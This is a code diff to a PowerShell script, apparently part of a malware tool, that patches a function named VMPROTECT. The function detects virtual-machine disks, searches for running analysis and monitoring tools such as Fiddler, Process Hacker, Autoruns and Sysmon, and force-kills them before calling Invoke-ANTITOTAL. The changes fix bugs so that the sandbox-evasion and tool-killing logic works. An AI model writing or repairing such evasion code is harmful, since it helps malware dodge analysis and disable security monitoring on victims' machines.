@@ -125,11 +125,12 @@ function ram_check {
 }
 
 function VMPROTECT {
-    ram_check 
+    ram_check  
     $d = wmic diskdrive get model
     if ($d -like "*DADY HARDDISK*" -or $d -like "*QEMU HARDDISK*") {  
         StopBatch   
     }	
+
     $processnames = @(
         "fiddler",
         "charles",
@@ -176,7 +177,7 @@ function VMPROTECT {
         "peek",
         "httpanalyzer",
         "httpdebug",
-        "ProcessHacker"
+        "ProcessHacker",
         "autoruns",
         "autoruns64",
         "autorunsc",
@@ -235,13 +236,18 @@ function VMPROTECT {
         "Sysmon64",
         "xenservice"
     )
+
+    $detectedProcesses = Get-Process -Name $processnames -ErrorAction SilentlyContinue
+
     if ($detectedProcesses) {
-        foreach ($pid in $detectedProcesses) {
-            Stop-Process -Id $pid -Force
+        foreach ($process in $detectedProcesses) {
+            Stop-Process -Id $process.Id -Force
+        }
     }
 
     if ($null -eq $detectedProcesses) {	
-        Invoke-ANTITOTAL
+        Invoke-ANTITOTAL 
     }
 }
 VMPROTECT
+
